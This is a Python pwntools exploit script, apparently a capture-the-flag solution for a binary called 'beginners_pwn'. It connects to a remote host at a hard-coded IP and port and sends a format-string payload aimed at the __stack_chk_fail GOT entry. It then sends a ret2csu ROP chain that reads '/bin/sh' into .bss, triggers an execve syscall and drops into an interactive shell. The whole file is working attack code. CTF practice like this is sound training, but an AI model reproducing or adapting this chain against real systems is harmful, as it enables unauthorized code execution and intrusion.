#!/usr/bin/python3

from pwn import *

offset = 24
#r = process("./beginners_pwn")
elf = ELF("./beginners_pwn")
context.binary = "./beginners_pwn"

syscall = 0x000000000040118f
ret = 0x000000000040101a
bss = 0x404060
add_rsp_8 = 0x0000000000401016


def csu_payload_1(edi, rsi, rdx): #0x404018
	r14 = p64(rdx)
	r13 = p64(rsi)
	r12 = p64(edi)
	r15 = p64(0x400000)
	rbx = p64(0x803)
	rbp = p64(0x803 + 1)


	payload = p64(0x00000000004012ba)
	payload += rbx
	payload += rbp
	payload += r12
	payload += r13
	payload += r14
	payload += r15
	payload += p64(0x00000000004012a0)
	payload += p64(0)*2
	payload += p64(bss + 0x3b)
	payload += p64(0)*4
	payload += p64(syscall)

	return payload


r = remote("35.221.81.216", 30002)

__stack_chk_fail = elf.got["__stack_chk_fail"]

 #%s
fmt  = b"%7$s%s" + b"\x00"*2
fmt += p64(__stack_chk_fail)
r.sendline(fmt)
payload = b''
payload += csu_payload_1(0,bss,0x100)
payload += csu_payload_1(bss, 0, 0)
r.sendline(p64(ret)*2 + p64(add_rsp_8) + b' ' + b"M"*(8*3) + payload) #8
pause()
last = b"/bin/sh\0" + b"\x00"*(0x2b - 0x8) + p64(0xffffffffffffffc5)
last += b"\x00"*(0x3b - len(last) - 0x1)

r.sendline(last)
r.interactive()
